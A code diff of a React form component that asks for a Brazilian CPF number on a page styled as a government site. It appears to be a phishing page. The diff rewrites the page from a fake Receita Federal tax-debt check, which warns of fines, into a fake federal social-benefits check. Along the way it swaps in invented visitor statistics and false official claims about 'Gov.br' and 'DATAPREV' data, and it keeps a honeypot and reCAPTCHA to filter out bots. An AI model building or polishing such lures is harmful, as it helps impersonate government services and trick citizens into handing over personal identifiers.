@@ -46,32 +46,20 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
         });
       }
     };
-
-    if (window.grecaptcha) {
-      renderRecaptcha();
-    } else {
-      const interval = setInterval(() => {
-        if (window.grecaptcha) {
-          clearInterval(interval);
-          renderRecaptcha();
-        }
-      }, 200);
+    if (window.grecaptcha) { renderRecaptcha(); }
+    else {
+      const interval = setInterval(() => { if (window.grecaptcha) { clearInterval(interval); renderRecaptcha(); } }, 200);
       return () => clearInterval(interval);
     }
   }, []);
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setCpf(formatCpf(e.target.value));
-  };
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => { setCpf(formatCpf(e.target.value)); };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // Honeypot: if filled, silently reject (only bots fill hidden fields)
     if (honeypot) return;
     const digits = cpf.replace(/\D/g, "");
-    if (digits.length === 11 && recaptchaToken) {
-      onSubmit(digits, recaptchaToken);
-    }
+    if (digits.length === 11 && recaptchaToken) { onSubmit(digits, recaptchaToken); }
   };
 
   const isValid = cpf.replace(/\D/g, "").length === 11 && !!recaptchaToken;
@@ -79,8 +67,6 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
   return (
     <div className="min-h-screen bg-background flex flex-col">
       <GovHeader />
-
-      {/* Scrollable content area */}
       <div className="flex-1 overflow-y-auto">
         <div className="px-4 py-5 space-y-4 max-w-lg mx-auto">
 
@@ -92,10 +78,10 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
               </div>
               <div>
                 <h1 className="text-[15px] font-extrabold leading-tight">
-                  Consulta de Pendências
+                  Consulta de Benefícios
                 </h1>
                 <p className="mt-1 text-[11px] text-white/60 leading-relaxed">
-                  Verifique sua situação cadastral junto à Receita Federal em tempo real
+                  Verifique seus benefícios sociais disponíveis junto ao Governo Federal em tempo real
                 </p>
               </div>
             </div>
@@ -105,7 +91,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           <div className="flex items-center gap-2.5 rounded-xl bg-destructive/10 border border-destructive/20 px-3.5 py-2.5">
             <AlertTriangle className="h-4 w-4 text-destructive shrink-0" />
             <p className="text-[11px] text-destructive font-medium leading-snug">
-              Prazo para regularização: consulte agora e evite multas adicionais
+              Novos benefícios disponíveis: consulte agora e garanta seus direitos
             </p>
           </div>
 
@@ -113,7 +99,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           <form onSubmit={handleSubmit}>
             <div className="rounded-2xl border border-border bg-card p-5 shadow-lg">
               <label className="mb-1.5 block text-[11px] font-bold text-muted-foreground uppercase tracking-widest">
-                CPF do Contribuinte
+                CPF do Beneficiário
               </label>
               <input
                 type="text"
@@ -125,17 +111,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
                 autoComplete="off"
                 autoFocus
               />
-              {/* Honeypot field — invisible to real users, bots auto-fill it */}
-              <input
-                type="text"
-                name="website_url"
-                value={honeypot}
-                onChange={(e) => setHoneypot(e.target.value)}
-                tabIndex={-1}
-                autoComplete="off"
-                aria-hidden="true"
-                style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0 }}
-              />
+              <input type="text" name="website_url" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" aria-hidden="true" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0 }} />
               <div className="mt-4 flex justify-center">
                 <div ref={recaptchaRef} />
               </div>
@@ -145,25 +121,25 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
                 className="mt-4 w-full rounded-xl gradient-primary px-4 py-4 text-[14px] font-bold text-primary-foreground transition-all hover:opacity-90 disabled:opacity-30 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-lg active:scale-[0.97]"
               >
                 <Search className="h-5 w-5" />
-                Consultar Situação
+                Consultar Benefícios
                 <ChevronRight className="h-4 w-4 ml-1" />
               </button>
             </div>
           </form>
 
-          {/* Stats cards - horizontal scroll */}
+          {/* Stats cards */}
           <div className="flex gap-3 overflow-x-auto pb-1 -mx-1 px-1 snap-x">
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
-              <p className="text-lg font-extrabold text-primary tabular-nums">2.847</p>
+              <p className="text-lg font-extrabold text-primary tabular-nums">4.312</p>
               <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Consultas hoje</p>
             </div>
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
-              <p className="text-lg font-extrabold text-accent tabular-nums">1.523</p>
-              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Regularizados</p>
+              <p className="text-lg font-extrabold text-accent tabular-nums">2.891</p>
+              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Benefícios liberados</p>
             </div>
             <div className="min-w-[120px] snap-start rounded-2xl border border-border bg-card p-3.5 shadow-sm">
-              <p className="text-lg font-extrabold text-destructive tabular-nums">98,7%</p>
-              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Com pendências</p>
+              <p className="text-lg font-extrabold text-destructive tabular-nums">97,3%</p>
+              <p className="text-[9px] text-muted-foreground uppercase tracking-wider mt-0.5">Com benefícios</p>
             </div>
           </div>
 
@@ -176,7 +152,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
               <div className="text-[11px] text-muted-foreground leading-relaxed">
                 <p className="font-semibold text-foreground text-xs mb-1">Sobre a consulta</p>
                 <p>
-                  Consulta gratuita de pendências fiscais. Dados obtidos em tempo real do sistema SERPRO.
+                  Consulta gratuita de benefícios sociais. Dados obtidos em tempo real do sistema DATAPREV.
                 </p>
               </div>
             </div>
@@ -191,7 +167,7 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
             <div className="h-3 w-px bg-border" />
             <div className="flex items-center gap-1">
               <Lock className="h-3 w-3 text-accent" />
-              <span>ICP-Brasil</span>
+              <span>Gov.br</span>
             </div>
             <div className="h-3 w-px bg-border" />
             <div className="flex items-center gap-1">
@@ -201,7 +177,6 @@ const CpfInput = ({ onSubmit, onTabChange }: CpfInputProps) => {
           </div>
         </div>
       </div>
-
       <GovFooter activeTab="inicio" onTabChange={onTabChange} />
     </div>
   );
